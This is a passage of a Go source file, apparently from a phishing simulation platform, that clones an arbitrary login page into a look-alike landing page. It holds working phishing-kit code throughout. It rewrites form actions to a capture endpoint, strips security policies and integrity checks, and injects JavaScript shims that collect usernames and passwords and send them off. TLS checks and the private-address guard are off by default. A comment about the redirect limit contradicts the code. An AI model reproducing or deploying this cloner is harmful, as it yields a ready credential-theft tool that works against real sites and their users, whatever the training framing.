// Package clone fetches an external site and turns it into a phishing landing
// page: it downloads the page, rewrites its references so the copy is
// self-contained, mirrors same-origin assets, and rewrites every form action so
// credential submission is captured by the phishing portal instead of the real
// site. It is used by the phishing simulation platform to build a training
// landing page that looks and behaves like the target login page.
//
// The cloner is deliberately permissive about TLS: training targets are often
// served from a self-signed certificate, which a strict client would refuse.
// Set StrictTLS when cloning a site whose certificate must be validated.
package clone

import (
	"bytes"
	"crypto/sha256"
	"crypto/tls"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"html"
	"io"
	"mime"
	"net"
	"net/http"
	"net/url"
	"path"
	"regexp"
	"sort"
	"strings"
	"sync"
	"time"
)

// Options configures one clone.
type Options struct {
	URL     string
	BaseURL string // phishing portal public base URL, used for link rewriting
	Timeout time.Duration

	// StrictTLS verifies the target's certificate. The default (false) accepts
	// self-signed training sites.
	StrictTLS bool

	// DenyPrivate refuses to fetch targets (or redirect targets) that resolve to
	// private, loopback, link-local, or unspecified addresses. Off by default so
	// cloning an internal training host keeps working; enable it when the clone
	// URL can be influenced by an untrusted party.
	DenyPrivate bool

	// MirrorAssets downloads same-origin scripts, styles, images, and fonts and
	// rewrites references to local paths. This is what makes an SPA shell usable
	// after cloning: without its bundle the page renders blank.
	MirrorAssets bool
	MaxAssets    int
	MaxAssetSize int64

	// SPAShim injects a small same-origin fetch/XHR interceptor that answers
	// API calls with an empty-but-valid JSON body, so a client-rendered app
	// shows its shell instead of an error state.
	SPAShim bool

	// StaticForm strips the page's scripts, hides loading overlays and injects
	// a DOM-level credential capture shim. It trades SPA behaviour for a page
	// that reliably renders and submits to the phishing portal. Best for pages
	// whose login form is present in the initial HTML.
	StaticForm bool

	// CaptureNet records every same-origin response the headless browser loads
	// during the render (scripts, lazy chunks, styles, XHR/fetch JSON) and
	// mirrors them, so a full SPA clone keeps working offline. It needs the
	// browser path (CloneWithBrowser) and costs a few seconds per clone.
	CaptureNet bool

	// AssetPrefix is the URL prefix for mirrored assets. It must match where
	// the caller serves them. Default "/assets/".
	AssetPrefix string

	// FormActionBase receives rewritten form submissions (credential capture
	// stays on the platform). Defaults to BaseURL.
	FormActionBase string

	// FormAction, when set, rewrites every form action to this exact URL,
	// ignoring the original path. The integrated cloner uses it to point all
	// credential submissions at the platform's capture endpoint regardless of the
	// cloned site's own action path.
	FormAction string

	UserAgent    string
	MaxBodyBytes int64

	redirects int // internal JSON-redirect hop counter
}

// Asset is one mirrored same-origin resource.
type Asset struct {
	URL         string `json:"url"`
	Path        string `json:"path"`
	ContentType string `json:"content_type"`
	Body        []byte `json:"-"`
}

// Result is one fetched, rewritten, and injected clone.
type Result struct {
	Body        []byte
	ContentType string
	FinalURL    string
	SPA         bool
	Assets      map[string]Asset

	// Diagnostics help the operator tell a good clone from a blank shell.
	FormCount     int `json:"form_count"`
	PasswordCount int `json:"password_count"`
	// CapturedAPI counts XHR/fetch JSON responses replayed by the SPA shim.
	CapturedAPI int `json:"captured_api"`
}

const (
	defaultUserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 " +
		"(KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36"
	defaultMaxAssets = 64
	defaultMaxAsset  = 4 << 20
	defaultMaxBody   = 8 << 20
)

// Clone fetches url, mirrors and rewrites its references into a self-contained
// landing page whose form actions point at the phishing capture endpoint.
func Clone(opts Options) (*Result, error) {
	if opts.URL == "" {
		return nil, fmt.Errorf("clone: url required")
	}
	opts.applyDefaults()
	opts.redirects++
	if opts.redirects > 5 {
		return nil, fmt.Errorf("clone: too many JSON redirects")
	}

	if opts.DenyPrivate {
		if u, err := url.Parse(opts.URL); err == nil && u.Host != "" {
			if isPrivateHost(u.Host) {
				return nil, fmt.Errorf("clone: refusing private target %q (deny-private)", opts.URL)
			}
		}
	}

	client := newClient(opts)
	req, err := http.NewRequest(http.MethodGet, opts.URL, nil)
	if err != nil {
		return nil, err
	}
	req.Header.Set("User-Agent", opts.UserAgent)
	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/json;q=0.9,*/*;q=0.8")
	resp, err := client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(io.LimitReader(resp.Body, opts.MaxBodyBytes))
	if err != nil {
		return nil, err
	}
	final := resp.Request.URL
	// A 4xx/5xx status is not a clone failure: login pages sit behind 401/403
	// (this SSO redirects to OAuth and returns 403 with its login SPA), and
	// those are exactly the login pages we want. The content-type checks below
	// reject bodies that are not HTML or JSON.
	ct := resp.Header.Get("Content-Type")

	res := &Result{
		ContentType: ct,
		FinalURL:    final.String(),
		Assets:      map[string]Asset{},
	}

	switch {
	case isJSON(ct, body):
		// Some SPA/OAuth frontends answer a bare GET with a JSON redirect
		// instruction instead of an HTTP 3xx. Follow it to reach the real
		// login page.
		if redir := jsonRedirectURL(body); redir != "" && redir != opts.URL {
			opts.URL = redir
			return Clone(opts)
		}
		res.Body = body
		res.ContentType = ct
		return res, nil
	case isHTML(ct, body):
		res.SPA = isSPA(body)
		if opts.MirrorAssets {
			res.Assets = mirrorAssets(client, final, body, opts, nil)
		}
		out := rewriteHTML(body, final, opts, res.Assets)
		if opts.StaticForm {
			out = staticFormTransform(out)
		} else if res.SPA && opts.SPAShim {
			out = injectSPAShim(out, assetPathMap(res.Assets), nil)
		}
		res.Body = out
		fillDiagnostics(res)
		return res, nil
	default:
		return nil, fmt.Errorf("clone: %s is not HTML or JSON (content-type %q)", opts.URL, ct)
	}
}

// jsonRedirectURL extracts a JSON-encoded redirect target from a body, so a
// frontend that answers with {"type":"redirect","redirectUrl":...} is followed
// to its real page.
func jsonRedirectURL(body []byte) string {
	var m map[string]any
	if err := json.Unmarshal(body, &m); err != nil {
		return ""
	}
	for _, k := range []string{"redirectUrl", "redirect_url", "url", "location", "redirect"} {
		if v, ok := m[k].(string); ok && strings.HasPrefix(v, "http") {
			return v
		}
	}
	return ""
}

func (o *Options) applyDefaults() {
	if o.Timeout <= 0 {
		o.Timeout = 15 * time.Second
	}
	if o.MaxAssets <= 0 {
		o.MaxAssets = defaultMaxAssets
	}
	if o.MaxAssetSize <= 0 {
		o.MaxAssetSize = defaultMaxAsset
	}
	if o.AssetPrefix == "" {
		o.AssetPrefix = "/assets/"
	}
	if !strings.HasSuffix(o.AssetPrefix, "/") {
		o.AssetPrefix += "/"
	}
	if o.FormActionBase == "" {
		o.FormActionBase = o.BaseURL
	}
	if o.UserAgent == "" {
		o.UserAgent = defaultUserAgent
	}
	if o.MaxBodyBytes <= 0 {
		o.MaxBodyBytes = defaultMaxBody
	}
}

func newClient(opts Options) *http.Client {
	return &http.Client{
		Timeout: opts.Timeout,
		Transport: &http.Transport{
			// A deception clone regularly targets a lab or training host behind a
			// self-signed certificate. Verification is opt-in via StrictTLS.
			TLSClientConfig:   &tls.Config{InsecureSkipVerify: !opts.StrictTLS}, //nolint:gosec
			ForceAttemptHTTP2: true,
			MaxIdleConns:      16,
			IdleConnTimeout:   30 * time.Second,
		},
		// Follow at most three redirects and never carry credentials. With
		// DenyPrivate, a redirect is also refused when it resolves to a private
		// address (SSRF guard).
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			if len(via) >= 10 {
				return fmt.Errorf("too many redirects (%d)", len(via))
			}
			if opts.DenyPrivate && req.URL.Host != "" && isPrivateHost(req.URL.Host) {
				return fmt.Errorf("redirect to private address refused")
			}
			return nil
		},
	}
}

// IsPrivateHost reports whether host (with or without a port, and with or
// without IPv6 brackets) resolves to a private, loopback, link-local, or
// unspecified address. It backs the optional DenyPrivate SSRF guard and is
// exported for callers that fetch URLs on the agent's behalf.
func IsPrivateHost(hostport string) bool { return isPrivateHost(hostport) }

// isPrivateHost reports whether host (with or without a port, and with or
// without IPv6 brackets) resolves to a private, loopback, link-local, or
// unspecified address. It backs the optional DenyPrivate SSRF guard.
func isPrivateHost(hostport string) bool {
	host := hostport
	if h, _, err := net.SplitHostPort(hostport); err == nil {
		host = h
	}
	host = strings.Trim(host, "[]")
	if ip := net.ParseIP(host); ip != nil {
		return ip.IsPrivate() || ip.IsLoopback() || ip.IsLinkLocalUnicast() ||
			ip.IsLinkLocalMulticast() || ip.IsUnspecified()
	}
	ips, err := net.LookupIP(host)
	if err != nil {
		return false
	}
	for _, ip := range ips {
		if ip.IsPrivate() || ip.IsLoopback() || ip.IsLinkLocalUnicast() ||
			ip.IsLinkLocalMulticast() || ip.IsUnspecified() {
			return true
		}
	}
	return false
}

func isHTML(ct string, body []byte) bool {
	if strings.Contains(strings.ToLower(ct), "text/html") ||
		strings.Contains(strings.ToLower(ct), "application/xhtml") {
		return true
	}
	l := body
	if len(l) > 512 {
		l = l[:512]
	}
	low := bytes.ToLower(l)
	return bytes.Contains(low, []byte("<html")) || bytes.Contains(low, []byte("<!doctype html"))
}

func isJSON(ct string, body []byte) bool {
	low := strings.ToLower(ct)
	if strings.Contains(low, "json") {
		return true
	}
	if strings.Contains(low, "html") {
		return false
	}
	trimmed := bytes.TrimSpace(body)
	return len(trimmed) > 0 && (trimmed[0] == '{' || trimmed[0] == '[')
}

// ---------------------------------------------------------------------------
// SPA detection and shim

// isSPA reports whether the document is a client-rendered shell: an empty mount
// point plus a bundle. Cloning only the HTML of such a page produces a blank
// screen, so the caller should mirror assets and inject the shim.
func isSPA(doc []byte) bool {
	low := strings.ToLower(string(doc))
	for _, marker := range []string{
		`id="root"`, `id='root'`, `id="app"`, `id='app'`, `id="__next"`,
		`__next_data__`, `data-reactroot`, `ng-app`, `ng-version`, `id="main"`,
	} {
		if strings.Contains(low, marker) {
			return true
		}
	}
	return false
}

// spaShimJS answers same-origin API calls with an empty JSON envelope so a
// client-rendered application mounts instead of hanging on a failed request.
// It never intercepts assets or cross-origin traffic.
const spaShimJS = `(function(){if(window.__HP_CLONE__)return;window.__HP_CLONE__={ok:true};
var ASSET=__HP_ASSETS__,API=__HP_API__;
var pathkey=function(u){try{return new URL(u,location.href).pathname}catch(e){return ''}};
var qkey=function(u){try{var a=new URL(u,location.href);return a.pathname+(a.search||'')}catch(e){return ''}};
var cross=function(u){try{return new URL(u,location.href).origin!==location.origin}catch(e){return false}};
var asset=function(u){return /\.(?:js|mjs|css|png|jpe?g|gif|svg|ico|woff2?|ttf|map)(?:\?|$)/i.test(u)};
var fake=function(){return Promise.resolve(new Response('{"ok":true,"code":0,"success":true,"data":{},"items":[],"results":[]}',{status:200,headers:{'Content-Type':'application/json'}}))};
var visible=function(el){try{return !!(el&&(el.offsetWidth||el.offsetHeight||el.getClientRects().length))}catch(e){return false}};
var pick=function(list){var v='';list.forEach(function(el){try{if(el.value&&el.value.length>v.length)v=el.value}catch(e){}});return v};
var last=0;
var collect=function(){
  var scope=document.querySelector('form')||document;
  var users=[].slice.call(scope.querySelectorAll('input[type="text"],input[type="email"],input:not([type])')).filter(visible);
  var passes=[].slice.call(scope.querySelectorAll('input[type="password"]')).filter(visible);
  var data=new URLSearchParams();
  var u=pick(users);
  var p=pick(passes);
  if(u)data.set('username',u);
  if(p)data.set('password',p);
  [].slice.call(scope.querySelectorAll('input[name]')).forEach(function(el){try{if(el.value&&!data.has(el.name))data.set(el.name,el.value)}catch(e){}});
  return data;
};
var capture=function(){
  try{
    if(Date.now()-last<1500)return;
    var data=collect();
    if(!data.toString())return;
    last=Date.now();
    var parts=location.pathname.split('/').filter(Boolean);
    if(parts.length<2)return;
    var url='/'+parts[0]+'/'+parts[1]+'/submit';
    if(navigator.sendBeacon){navigator.sendBeacon(url,data);return}
    var f=document.createElement('form');f.method='POST';f.action=url;f.style.display='none';
    data.forEach(function(v,k){var i=document.createElement('input');i.type='hidden';i.name=k;i.value=v;f.appendChild(i)});
    (document.body||document.documentElement).appendChild(f);f.submit();
    setTimeout(function(){try{f.remove()}catch(e){}},1000);
  }catch(e){}
};
var loginish=function(u,m){u=String(u||'').toLowerCase();m=String(m||'GET').toUpperCase();
  return m!=='GET'||/login|signin|sign-in|auth|token|sso|idp|session/.test(u)};
var of=window.fetch;
if(of){window.fetch=function(input,init){
  try{var u=typeof input==='string'?input:(input&&input.url)||'';
    var m=(init&&init.method)||(input&&input.method)||'GET';
    var t=API[qkey(u)];
    if(t&&String(m).toUpperCase()==='GET')return of.call(this,t,init);
    if(u&&!cross(u)&&!asset(u)&&loginish(u,m))capture();
    if(!u||cross(u)||asset(u))return of.apply(this,arguments);
  }catch(e){return of.apply(this,arguments)}
  return fake()}}
var XO=window.XMLHttpRequest;
if(XO){window.XMLHttpRequest=function(){var x=new XO(),open=x.open,send=x.send,hp=false,lm='GET',url='';
x.open=function(m,u){lm=m;url=u;hp=!cross(u)&&!asset(u);return open.apply(x,arguments)};
x.send=function(){if(!hp)return send.apply(x,arguments);
  try{if(loginish(url,lm))capture()}catch(e){}
  var t=API[qkey(url)];
  if(t&&String(lm).toUpperCase()==='GET'){try{open.call(x,'GET',t)}catch(e){}return send.apply(x,arguments)}
  var self=x;setTimeout(function(){try{Object.defineProperty(self,'readyState',{value:4});Object.defineProperty(self,'status',{value:200});Object.defineProperty(self,'responseText',{value:'{"ok":true,"code":0,"success":true,"data":{}}'});self.onreadystatechange&&self.onreadystatechange();self.onload&&self.onload()}catch(e){}},0)};
return x}}
var fix=function(el){
  try{
    if(!el)return;
    var nodes=[];
    if(el.nodeType===1)nodes.push(el);
    if(el.querySelectorAll)nodes=nodes.concat([].slice.call(el.querySelectorAll('[src],[href],[srcset]')));
    nodes.forEach(function(n){
      try{
        ['src','href'].forEach(function(a){
          var v=n.getAttribute&&n.getAttribute(a);
          if(!v)return;
          var t=ASSET[pathkey(v)];
          if(t&&v!==t)n.setAttribute(a,t);
        });
        var ss=n.getAttribute&&n.getAttribute('srcset');
        if(ss){
          var out=ss.split(',').map(function(p){var f=p.trim().split(/\s+/);if(!f[0])return p;var t=ASSET[pathkey(f[0])];if(t)f[0]=t;return f.join(' ')}).join(', ');
          if(out!==ss)n.setAttribute('srcset',out);
        }
      }catch(e){}
    });
  }catch(e){}
};
try{new MutationObserver(function(ms){ms.forEach(function(m){
  if(m.type==='attributes'){fix(m.target);return}
  m.addedNodes.forEach(function(n){fix(n)})})}).observe(document.documentElement,{childList:true,subtree:true,attributes:true,attributeFilter:['src','href','srcset']})}catch(e){}
document.addEventListener('submit',function(){capture()},true);
document.addEventListener('click',function(e){var t=e.target;while(t&&t!==document){var s=(t.textContent||'').replace(/\s+/g,'').trim();if(/^(登录|登陆|立即登录|login|signin)$/i.test(s)){capture();break}t=t.parentElement}},true);
})();`

// spaShim renders the interceptor. assetMap maps an upstream pathname to the
// mirrored local path (used by the MutationObserver for dynamically inserted
// chunks); apiMap maps "pathname?query" of a captured XHR/fetch response to its
// mirrored JSON, so the app receives real captured data instead of an empty
// envelope. Both may be nil.
func spaShim(assetMap, apiMap map[string]string) []byte {
	if assetMap == nil {
		assetMap = map[string]string{}
	}
	if apiMap == nil {
		apiMap = map[string]string{}
	}
	a, _ := json.Marshal(assetMap)
	b, _ := json.Marshal(apiMap)
	js := strings.NewReplacer("__HP_ASSETS__", string(a), "__HP_API__", string(b)).Replace(spaShimJS)
	return []byte(`<script data-hp-clone="1">` + js + `</script>`)
}

// staticFormTransform removes the page's scripts, hides common full-screen
// loading overlays and installs a DOM-level capture shim. The resulting page
// renders as plain HTML/CSS and submits credentials to the portal.
func staticFormTransform(doc []byte) []byte {
	s := scriptTagRe.ReplaceAllString(string(doc), "")
	s = scriptSelfRe.ReplaceAllString(s, "")
	// The original app enables the submit button and unlocks inputs from JS.
	// With JS stripped they stay disabled, and disabled controls never emit
	// click events, so the capture shim would never run.
	s = disabledAttrRe.ReplaceAllString(s, "")
	s = readonlyAttrRe.ReplaceAllString(s, "")
	s = isDisabledClassRe.ReplaceAllString(s, "")
	// A CSP meta or subresource integrity hash would block the injected shim or
	// rewritten assets; the clone is served from our own origin.
	s = cspMetaRe.ReplaceAllString(s, "")
	s = integrityAttrRe.ReplaceAllString(s, "")
	s = injectAfterHead(s, `<style data-hp-static="1">#index-loading,#loading,.loading-mask,.el-loading-mask{display:none!important}</style>`)
	s = injectAfterHead(s, `<style data-hp-mobile="1">@media(max-width:640px){input,textarea,select{font-size:16px!important}img,video{max-width:100%;height:auto}body{overflow-x:hidden}}</style>`)
	if !viewportMetaRe.MatchString(s) {
		s = injectAfterHead(s, `<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">`)
	}
	s = injectBeforeBody(s, `<script data-hp-static-form="1">`+staticFormShimJS+`</script>`)
	return []byte(s)
}

var (
	scriptTagRe       = regexp.MustCompile(`(?is)<script\b[^>]*>.*?</script\s*>`)
	scriptSelfRe      = regexp.MustCompile(`(?is)<script\b[^>]*/\s*>`)
	disabledAttrRe    = regexp.MustCompile(`(?is)\s(?:disabled|aria-disabled)(?:\s*=\s*(?:"[^"]*"|'[^']*'|[^\s>]+))?`)
	readonlyAttrRe    = regexp.MustCompile(`(?is)\sreadonly(?:\s*=\s*(?:"[^"]*"|'[^']*'|[^\s>]+))?`)
	isDisabledClassRe = regexp.MustCompile(`(?is)\s*is-disabled\b`)
	cspMetaRe         = regexp.MustCompile(`(?is)<meta[^>]+http-equiv\s*=\s*["']?Content-Security-Policy["']?[^>]*>`)
	integrityAttrRe   = regexp.MustCompile(`(?is)\sintegrity\s*=\s*(?:"[^"]*"|'[^']*'|[^\s>]+)`)
	viewportMetaRe    = regexp.MustCompile(`(?is)<meta[^>]+name\s*=\s*["']?viewport`)
)

func injectAfterHead(s, block string) string {
	lower := strings.ToLower(s)
	if h := strings.Index(lower, "<head"); h >= 0 {
		if end := strings.IndexByte(s[h:], '>'); end >= 0 {
			i := h + end + 1
			return s[:i] + block + "\n" + s[i:]
		}
	}
	return block + s
}

func injectBeforeBody(s, block string) string {
	lower := strings.ToLower(s)
	if i := strings.LastIndex(lower, "</body>"); i >= 0 {
		return s[:i] + block + "\n" + s[i:]
	}
	return s + "\n" + block
}

const staticFormShimJS = `(function(){if(window.__HP_STATIC__)return;window.__HP_STATIC__=1;
var vis=function(el){try{return !!(el&&(el.offsetWidth||el.offsetHeight||el.getClientRects().length))}catch(e){return false}};
var pick=function(list){var v='';list.forEach(function(el){try{if(el.value&&el.value.length>v.length)v=el.value}catch(e){}});return v};
// Find the first form, descending into shadow roots and same-origin iframes.
var deepForm=function(){
  var q=[document],seen=0;
  while(q.length&&seen<200){seen++;var root=q.shift();
    try{var f=root.querySelector?root.querySelector('form'):null;if(f)return f}catch(e){}
    try{
      var all=root.querySelectorAll?root.querySelectorAll('*'):[];
      for(var i=0;i<all.length;i++){if(all[i].shadowRoot)q.push(all[i].shadowRoot)}
      var fs=root.querySelectorAll?root.querySelectorAll('iframe'):[];
      for(var j=0;j<fs.length;j++){try{var d=fs[j].contentDocument;if(d)q.push(d)}catch(e){}}
    }catch(e){}
  }
  return null;
};
var prep=function(){
  try{
    var form=deepForm();if(!form)return null;
    var parts=location.pathname.split('/').filter(Boolean);if(parts.length<2)return null;
    form.method='post';form.action='/'+parts[0]+'/'+parts[1]+'/submit';
    form.setAttribute('autocomplete','on');
    var us=[].slice.call(form.querySelectorAll('input[type="text"],input[type="email"],input:not([type])')).filter(vis);
    var ps=[].slice.call(form.querySelectorAll('input[type="password"]')).filter(vis);
    if(us.length){var u=us[us.length-1];u.name='username';u.setAttribute('autocomplete','username');u.removeAttribute('readonly')}
    if(ps.length){var p=ps[ps.length-1];p.name='password';p.setAttribute('autocomplete','current-password');p.removeAttribute('readonly')}
    [].slice.call(form.querySelectorAll('input')).forEach(function(el){try{var a=(el.getAttribute('autocomplete')||'').toLowerCase();if(a==='off'||a==='new-password')el.setAttribute('autocomplete','on')}catch(e){}});
    return form;
  }catch(e){return null}
};
var send=function(){
  try{
    var form=prep();var scope=form||document;
    var us=[].slice.call(scope.querySelectorAll('input[type="text"],input[type="email"],input:not([type])')).filter(vis);
    var ps=[].slice.call(scope.querySelectorAll('input[type="password"]')).filter(vis);
    var u=pick(us),p=pick(ps);
    if(!u&&!p)return false;
    if(form){
      if(us.length)us[us.length-1].name='username';
      if(ps.length)ps[ps.length-1].name='password';
      form.submit();
      return true;
    }
    var parts=location.pathname.split('/').filter(Boolean);if(parts.length<2)return false;
    var f=document.createElement('form');f.method='POST';f.action='/'+parts[0]+'/'+parts[1]+'/submit';f.style.display='none';
    var add=function(n,v){var i=document.createElement('input');i.type='hidden';i.name=n;i.value=v;f.appendChild(i)};
    add('username',u);add('password',p);
    (document.body||document.documentElement).appendChild(f);f.submit();return true;
  }catch(e){return false}
};
if(document.readyState==='loading')document.addEventListener('DOMContentLoaded',prep);else prep();
document.addEventListener('submit',function(e){if(send())e.preventDefault()},true);
document.addEventListener('click',function(e){var t=e.target;while(t&&t!==document){
  var s=(t.textContent||'').replace(/\s+/g,'');
  var c=(t.className&&t.className.baseVal!==undefined?t.className.baseVal:t.className)||'';
  if(/^(登录|登陆|立即登录|login|signin)$/i.test(s)||/submit|login|signin/i.test(c)){if(send())e.preventDefault();break}
  t=t.parentElement}},true);
document.addEventListener('keydown',function(e){if(e.key==='Enter'&&e.target&&e.target.type==='password'){if(send())e.preventDefault()}},true);
})();`

// ---------------------------------------------------------------------------
// Asset mirroring

var (
	assetTagRe  = regexp.MustCompile(`(?is)<(script|link|img|source|video|audio|iframe)\b[^>]*>`)
	attrRe      = regexp.MustCompile(`(?is)\b([a-zA-Z_:][-a-zA-Z0-9_:.]*)\s*=\s*(?:"([^"]*)"|'([^']*)'|([^\s>]+))`)
	cssURLRe    = regexp.MustCompile(`(?is)url\(\s*(['"]?)([^)'"]+?)(['"]?)\s*\)`)
	styleRe     = regexp.MustCompile(`(?is)(<style\b[^>]*>)(.*?)(</style>)`)
	styleAttr   = regexp.MustCompile(`(?is)\bstyle\s*=\s*(?:"([^"]*)"|'([^']*)')`)
	linkTagRe   = regexp.MustCompile(`(?is)<link\b[^>]*>`)
	anchorTagRe = regexp.MustCompile(`(?is)<a\b[^>]*>`)
	genericAttr = regexp.MustCompile(`(?is)\b(src|poster|data-src|data-href|formaction|action|background)\s*=\s*(?:"([^"]*)"|'([^']*)'|([^\s>]+))`)
	srcsetRe    = regexp.MustCompile(`(?is)\bsrcset\s*=\s*(?:"([^"]*)"|'([^']*)')`)
	baseTagRe   = regexp.MustCompile(`(?is)<base\b[^>]*>`)
)

func attrValue(tag, name string) (string, bool) {
	for _, m := range attrRe.FindAllStringSubmatch(tag, -1) {
		if !strings.EqualFold(m[1], name) {
			continue
		}
		for i := 2; i <= 4; i++ {
			if m[i] != "" {
				return m[i], true
			}
		}
		return "", true
	}
	return "", false
}

// pageBase honours a <base href> in the document so relative references
// resolve the same way the browser resolves them.
func pageBase(page *url.URL, doc []byte) *url.URL {
	m := baseTagRe.Find(doc)
	if m == nil {
		return page
	}
	v, ok := attrValue(string(m), "href")
	if !ok || strings.TrimSpace(v) == "" {
		return page
	}
	if u, ok := resolveURL(page, v); ok {
		return u
	}
	return page
}

// srcsetURLs extracts the candidate URLs from a srcset attribute value.
func srcsetURLs(v string) []string {
	var out []string
	for _, part := range strings.Split(v, ",") {
		fields := strings.Fields(strings.TrimSpace(part))
		if len(fields) > 0 {
			out = append(out, fields[0])
		}
	}
	return out
}

func collectAssetURLs(base *url.URL, doc []byte, max int) []string {
	base = pageBase(base, doc)
	set := map[string]bool{}
	add := func(raw string) {
		u, ok := resolveURL(base, raw)
		if !ok || u.Host != base.Host {
			return
		}
		if u.Scheme != "http" && u.Scheme != "https" {
			return
		}
		set[stripFragment(u.String())] = true
	}
	for _, tag := range assetTagRe.FindAllString(string(doc), -1) {
		lower := strings.ToLower(tag)
		switch {
		case strings.HasPrefix(lower, "<script"):
			if v, ok := attrValue(tag, "src"); ok {
				add(v)
			}
		case strings.HasPrefix(lower, "<link"):
			rel, _ := attrValue(tag, "rel")
			rel = strings.ToLower(rel)
			v, ok := attrValue(tag, "href")
			if !ok {
				continue
			}
			if strings.Contains(rel, "stylesheet") || strings.Contains(rel, "icon") ||
				strings.Contains(rel, "preload") || strings.Contains(rel, "modulepreload") ||
				hasAssetExt(v) {
				add(v)
			}
		default:
			for _, name := range []string{"src", "href", "poster", "data-src", "data-original", "data-lazy-src"} {
				if v, ok := attrValue(tag, name); ok {
					add(v)
				}
			}
		}
		if v, ok := attrValue(tag, "srcset"); ok {
			for _, c := range srcsetURLs(v) {
				add(c)
			}
		}
	}
	for _, m := range styleRe.FindAllStringSubmatch(string(doc), -1) {
		for _, cm := range cssURLRe.FindAllStringSubmatch(m[2], -1) {
			add(cm[2])
		}
	}
	for _, m := range styleAttr.FindAllStringSubmatch(string(doc), -1) {
		v := m[1]
		if v == "" {
			v = m[2]
		}
		for _, cm := range cssURLRe.FindAllStringSubmatch(v, -1) {
			add(cm[2])
		}
	}
	out := make([]string, 0, len(set))
	for u := range set {
		out = append(out, u)
	}
	sort.Strings(out)
	if max > 0 && len(out) > max {
		out = out[:max]
	}
	return out
}

var assetExts = map[string]bool{
	".js": true, ".mjs": true, ".css": true, ".png": true, ".jpg": true,
	".jpeg": true, ".gif": true, ".svg": true, ".webp": true, ".avif": true,
	".ico": true, ".woff": true, ".woff2": true, ".ttf": true, ".otf": true,
	".eot": true, ".map": true, ".json": true, ".wasm": true,
}

func hasAssetExt(raw string) bool {
	u, err := url.Parse(raw)
	if err != nil {
		return false
	}
	return assetExts[strings.ToLower(path.Ext(u.Path))]
}

// mirrorAssets downloads the references found in doc plus every seed asset
// (resources the browser captured from the network), assigns each a local
// path, and rewrites captured stylesheets. seed may be nil.
func mirrorAssets(client *http.Client, base *url.URL, doc []byte, opts Options, seed map[string]Asset) map[string]Asset {
	base = pageBase(base, doc)
	assets := map[string]Asset{}
	for k, a := range seed {
		assets[k] = a
	}
	var mu sync.Mutex
	fetchAll := func(urls []string) {
		var wg sync.WaitGroup
		sem := make(chan struct{}, 6)
		for _, u := range urls {
			mu.Lock()
			_, done := assets[u]
			mu.Unlock()
			if done {
				continue
			}
			wg.Add(1)
			sem <- struct{}{}
			go func(raw string) {
				defer wg.Done()
				defer func() { <-sem }()
				asset, err := fetchAsset(client, raw, opts.MaxAssetSize, opts.UserAgent)
				if err != nil {
					return
				}
				mu.Lock()
				assets[raw] = asset
				mu.Unlock()
			}(u)
		}
		wg.Wait()
	}

	fetchAll(collectAssetURLs(base, doc, opts.MaxAssets))

	// Second pass: stylesheets often reference fonts and images that appear
	// nowhere in the HTML. Pull those too, within the same asset budget.
	extra := map[string]bool{}
	for k, a := range assets {
		if !isCSS(k, a) {
			continue
		}
		u, err := url.Parse(k)
		if err != nil {
			continue
		}
		for _, raw := range collectCSSURLs(a.Body, u) {
			if _, known := assets[raw]; !known {
				extra[raw] = true
			}
		}
	}
	if room := opts.MaxAssets - len(assets); room > 0 && len(extra) > 0 {
		urls := make([]string, 0, len(extra))
		for u := range extra {
			urls = append(urls, u)
		}
		sort.Strings(urls)
		if len(urls) > room {
			urls = urls[:room]
		}
		fetchAll(urls)
	}

	keys := make([]string, 0, len(assets))
	for k := range assets {
		keys = append(keys, k)
	}
	sort.Strings(keys)
	for _, k := range keys {
		a := assets[k]
		a.Path = opts.AssetPrefix + assetName(k)
		assets[k] = a
	}
	// A mirrored stylesheet is served from the clone, so its own url(...)
	// references must point at mirrored assets as well; otherwise the CSS
	// requests them relative to /assets/... and they 404.
	for _, k := range keys {
		a := assets[k]
		if !isCSS(k, a) {
			continue
		}
		u, err := url.Parse(k)
		if err != nil {
			continue
		}
		a.Body = []byte(rewriteCSS(string(a.Body), u, opts, assets))
		assets[k] = a
	}
	return assets
}

func isCSS(key string, a Asset) bool {
	return strings.Contains(strings.ToLower(a.ContentType), "css") ||
		strings.HasSuffix(strings.ToLower(key), ".css")
}

// collectCSSURLs returns the same-origin resources a stylesheet references.
func collectCSSURLs(css []byte, base *url.URL) []string {
	set := map[string]bool{}
	for _, m := range cssURLRe.FindAllStringSubmatch(string(css), -1) {
		u, ok := resolveURL(base, m[2])
		if !ok || u.Host != base.Host || (u.Scheme != "http" && u.Scheme != "https") {
			continue
		}
		set[stripFragment(u.String())] = true
	}
	out := make([]string, 0, len(set))
	for u := range set {
		out = append(out, u)
	}
	sort.Strings(out)
	return out
}

func fetchAsset(client *http.Client, raw string, max int64, userAgent string) (Asset, error) {
	req, err := http.NewRequest(http.MethodGet, raw, nil)
	if err != nil {
		return Asset{}, err
	}
	if userAgent != "" {
		req.Header.Set("User-Agent", userAgent)
	}
	req.Header.Set("Accept", "*/*")
	resp, err := client.Do(req)
	if err != nil {
		return Asset{}, err
	}
	defer resp.Body.Close()
	if resp.StatusCode < 200 || resp.StatusCode >= 300 {
		return Asset{}, fmt.Errorf("asset %s: status %d", raw, resp.StatusCode)
	}
	data, err := io.ReadAll(io.LimitReader(resp.Body, max+1))
	if err != nil {
		return Asset{}, err
	}
	if int64(len(data)) > max {
		return Asset{}, fmt.Errorf("asset %s exceeds %d bytes", raw, max)
	}
	ct := resp.Header.Get("Content-Type")
	if ct == "" {
		ct = mime.TypeByExtension(path.Ext(raw))
	}
	return Asset{URL: raw, ContentType: ct, Body: data}, nil
}

// assetName maps a URL to a deterministic, collision-free local path. The hash
// prefix keeps two assets with the same basename apart; the basename keeps the
// path readable for an operator browsing the mirror.
func assetName(raw string) string {
	sum := sha256.Sum256([]byte(raw))
	u, err := url.Parse(raw)
	name := "asset.bin"
	if err == nil {
		if b := path.Base(u.Path); b != "" && b != "." && b != "/" {
			name = safeFilename(b)
		}
	}
	return hex.EncodeToString(sum[:8]) + "/" + name
}

var unsafeFilename = regexp.MustCompile(`[^A-Za-z0-9._-]+`)

func safeFilename(s string) string {
	s = unsafeFilename.ReplaceAllString(strings.TrimSpace(s), "_")
	s = strings.Trim(s, "._")
	if s == "" {
